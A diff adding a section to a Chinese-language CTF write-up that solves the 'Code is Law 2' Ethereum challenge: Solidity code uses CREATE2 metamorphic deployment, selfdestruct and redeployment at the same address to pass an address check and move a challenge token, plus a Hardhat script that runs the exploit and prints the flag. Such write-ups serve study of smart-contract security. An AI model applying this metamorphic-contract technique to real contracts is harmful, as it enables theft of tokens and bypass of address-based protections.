@@ -204,7 +204,7 @@ Download the **zip** file and follow the instructions in the **README.md** file 
     - `_balances` 为 `mapping` 类型，占用 `slot 0`，那么地址 `A` 的余额存储位置在 `keccak256(A | 0)`，`|` 表示连接
 
 - `Code is Law 2` 与 `Code is Law 1` 相比，只修改了 `ChallengeToken` 发放 `token` 的规则并禁用了 `approve`，因而修改存储的方法仍然适用 =）
-- 看了官方 WP[^2] 再来补充一下 =ω=
+- 看了官方 WP[^2][^3] 再来补充一下 =ω=
 
 ### Code is Law 1
 
@@ -277,6 +277,114 @@ Download the **zip** file and follow the instructions in the **README.md** file 
     });
     ```
 
+### Code is Law 2
+
+- `approve` 被禁用了，但发放 `token` 的规则有所宽限，不再需要是 `tx.origin` 初次部署的合约
+- 不过 Code is Law 1 中 `calculateAddressOfTheFirstContractDeployedBy` 依据的是 `CREATE` 操作码的地址计算规则，即新合约的地址与合约创建者的地址和由创建者发起的交易的数量有关。除此之外，合约还可以通过 `CREATE2` 操作码创建，此时的合约地址与合约创建者的地址、参数 `salt` 和合约创建代码有关，若保持合约创建代码不变，且构造函数返回的运行时字节码可控，就可以在同一地址上反复部署完全不同的合约
+- 接下来思路就很清晰啦，先利用 `CREATE2` 部署 `OnlyICanHazToken` 并在取得 `token` 后 `selfdestruct`，再在相同地址上部署新的合约来转移 `token`
+- 合约 `Deployer` 负责部署指定合约
+
+    ```js
+    //SPDX-License-Identifier: Unlicense
+    pragma solidity ^0.8.0;
+
+    contract Deployer {
+        mapping (address => address) _implementations;
+        address public deployAddr;
+
+        // will be called by the metamorphic Contract
+        function getImplementation() external view returns (address implementation) {
+            return _implementations[msg.sender];
+        }
+
+        function _getMetamorphicContractAddress(uint256 salt, bytes memory metamorphicCode) internal view returns (address) {
+            // determine the address of the metamorphic contract.
+            return address(uint160(uint256(keccak256(abi.encodePacked(hex"ff", address(this), salt, keccak256(abi.encodePacked(metamorphicCode)))))));
+        }
+
+        function deploy(bytes calldata bytecode, uint256 salt) public {
+            bytes memory implInitCode = bytecode;
+
+            // assign the initialization code for the metamorphic contract.
+            bytes memory metamorphicCode  = (
+                hex"5860208158601c335a63aaf10f428752fa158151803b80938091923cf3"
+                // here 3c (extcodecopy) is used, not 39 (codecopy)
+            );
+
+            // declare a variable for the address of the implementation contract.
+            address implementationContract;
+
+            // load implementation init code and length, then deploy via CREATE.
+            assembly {
+                implementationContract := create(0, add(0x20, implInitCode), mload(implInitCode))
+            }
+
+            address metamorphicContractAddress = _getMetamorphicContractAddress(salt, metamorphicCode);
+            // first we deploy the code we want to deploy on a separate address
+            // store the implementation to be retrieved by the metamorphic contract.
+            _implementations[metamorphicContractAddress] = implementationContract;
+
+            address addr;
+            assembly {  
+                addr := create2(
+                    0,  // send 0 wei
+                    add(0x20, metamorphicCode), // load initialization code.
+                    mload(metamorphicCode), // load init code's length.
+                    salt
+                )
+            }
+
+            deployAddr = addr;
+        }
+    }
+    ```
+
+- 合约 `Withdrawer` 用于转移 `token`，在 `OnlyICanHazToken` 实例自毁后由 `Deployer` 部署到原 `OnlyICanHazToken` 实例所在的地址
+
+    ```js
+    //SPDX-License-Identifier: Unlicense
+    pragma solidity ^0.8.0;
+
+    import "./ChallengeToken.sol";
+
+    contract Withdrawer {
+        function withdraw() public {
+            ChallengeToken(0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f).transfer(msg.sender, 1);
+        }
+    }
+    ```
+
+- 合约交互过程
+
+    ```js
+    it("Should return the winning flag", async function () {
+        challengeToken = await ethers.getContractAt("ChallengeToken", "0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f");
+
+        let salt = 1;
+
+        let deployerFactory = await ethers.getContractFactory("Deployer");
+        let deployer = await deployerFactory.deploy();
+        await deployer.deployed();
+
+        let onlyICanHazTokenFactory = await ethers.getContractFactory('OnlyICanHazToken');
+        await deployer.deploy(onlyICanHazTokenFactory.bytecode, salt);
+        let deployAddr = await deployer.deployAddr();
+        challengeToken.can_i_haz_token(deployAddr);
+
+        let onlyICanHazToken = await ethers.getContractAt("OnlyICanHazToken", deployAddr);
+        await onlyICanHazToken.bye();
+
+        let withdrawerFactory = await ethers.getContractFactory('Withdrawer');
+        await deployer.deploy(withdrawerFactory.bytecode, salt);
+        let withdrawer = await ethers.getContractAt("Withdrawer", deployAddr);
+        await withdrawer.withdraw();
+
+        const returnedFlag = await challengeToken.did_i_win();
+
+        console.log(`\tThe returned flag is: "${returnedFlag}"`)
+    });
+    ```
+
 ### Flag
 
 #### Code is Law 1
@@ -290,6 +398,8 @@ Download the **zip** file and follow the instructions in the **README.md** file 
 ## 参考资料
 
 - [ContractFactory | ethers](https://docs.ethers.io/v5/single-page/#/v5/api/contract/contract-factory/)
+- [EVM Dialect](https://docs.soliditylang.org/en/latest/yul.html?highlight=create2#evm-dialect)
+- [Overwriting Smart Contracts](https://ethereum-blockchain-developer.com/110-upgrade-smart-contracts/12-metamorphosis-create2/#overwriting-smart-contracts)
 
 [^1]: [Local ERC20 Balance Manipulation (with HardHat)](https://kndrck.co/posts/local_erc20_bal_mani_w_hh/)
 
